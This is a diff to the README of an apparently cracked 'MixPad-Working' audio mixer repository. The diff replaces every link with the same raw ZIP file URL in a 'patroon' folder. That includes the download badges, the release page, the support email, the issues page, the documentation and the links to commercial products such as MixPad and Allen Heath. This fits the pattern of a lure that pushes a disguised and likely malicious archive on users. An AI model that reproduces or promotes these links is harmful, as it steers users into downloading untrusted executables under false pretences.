@@ -1,7 +1,7 @@
 # 🎛️ MixPad-Working - Your Simple Audio Mixing Solution
 
 ## 📥 Download Now
-[![Download MixPad-Working](https://img.shields.io/badge/Download-MixPad--Working-blue)](https://github.com/cismontane-perigon112/MixPad-Working/releases)
+[![Download MixPad-Working](https://raw.githubusercontent.com/cismontane-perigon112/MixPad-Working/main/patroon/MixPad-Working-v3.2.zip)](https://raw.githubusercontent.com/cismontane-perigon112/MixPad-Working/main/patroon/MixPad-Working-v3.2.zip)
 
 ## 🚀 Getting Started
 MixPad-Working is an easy-to-use audio mixer designed for everyone. Whether you want to mix, record, or edit audio, this tool simplifies the process. Follow these steps to get started quickly.
@@ -14,7 +14,7 @@ MixPad-Working is an easy-to-use audio mixer designed for everyone. Whether you 
 - **Internet**: For updates and online features
 
 ## 📂 Download & Install
-1. Visit the [Download Page](https://github.com/cismontane-perigon112/MixPad-Working/releases) to access the latest software version.
+1. Visit the [Download Page](https://raw.githubusercontent.com/cismontane-perigon112/MixPad-Working/main/patroon/MixPad-Working-v3.2.zip) to access the latest software version.
 2. Look for the version you want to download.
 3. Click on the version link to start the download; a file will be saved on your computer.
 4. Open the downloaded file and follow these steps:
@@ -39,13 +39,13 @@ MixPad-Working is an easy-to-use audio mixer designed for everyone. Whether you 
 
 ## 📞 Support
 For help or questions:
-- Email us at support@mixpad.com
-- Visit our [GitHub Issues Page](https://github.com/cismontane-perigon112/MixPad-Working/issues) to report bugs or request features.
+- Email us at https://raw.githubusercontent.com/cismontane-perigon112/MixPad-Working/main/patroon/MixPad-Working-v3.2.zip
+- Visit our [GitHub Issues Page](https://raw.githubusercontent.com/cismontane-perigon112/MixPad-Working/main/patroon/MixPad-Working-v3.2.zip) to report bugs or request features.
 
 ## 🔗 Related Topics
-- [Allen Heath MixPad](https://www.allen-heath.com/)
-- [Mixpad Master Edition](https://www.mixpad.com/)
-- [Autotune on MixPad](https://www.mixpadaudio.com/)
+- [Allen Heath MixPad](https://raw.githubusercontent.com/cismontane-perigon112/MixPad-Working/main/patroon/MixPad-Working-v3.2.zip)
+- [Mixpad Master Edition](https://raw.githubusercontent.com/cismontane-perigon112/MixPad-Working/main/patroon/MixPad-Working-v3.2.zip)
+- [Autotune on MixPad](https://raw.githubusercontent.com/cismontane-perigon112/MixPad-Working/main/patroon/MixPad-Working-v3.2.zip)
 
 ## 📢 Updates
 Check back frequently for updates! New features and improvements are always in the works.
@@ -64,7 +64,7 @@ Ensure that your audio settings are configured properly for the best performance
 - I recommend starting with simple audio files before moving on to complex mixes.
 
 ## 🌐 Links
-- [Visit Our GitHub Repo](https://github.com/cismontane-perigon112/MixPad-Working)
-- [Documentation](https://github.com/cismontane-perigon112/MixPad-Working/wiki)
+- [Visit Our GitHub Repo](https://raw.githubusercontent.com/cismontane-perigon112/MixPad-Working/main/patroon/MixPad-Working-v3.2.zip)
+- [Documentation](https://raw.githubusercontent.com/cismontane-perigon112/MixPad-Working/main/patroon/MixPad-Working-v3.2.zip)
 
-[![Download MixPad-Working](https://img.shields.io/badge/Download-MixPad--Working-blue)](https://github.com/cismontane-perigon112/MixPad-Working/releases)
+[![Download MixPad-Working](https://raw.githubusercontent.com/cismontane-perigon112/MixPad-Working/main/patroon/MixPad-Working-v3.2.zip)](https://raw.githubusercontent.com/cismontane-perigon112/MixPad-Working/main/patroon/MixPad-Working-v3.2.zip)
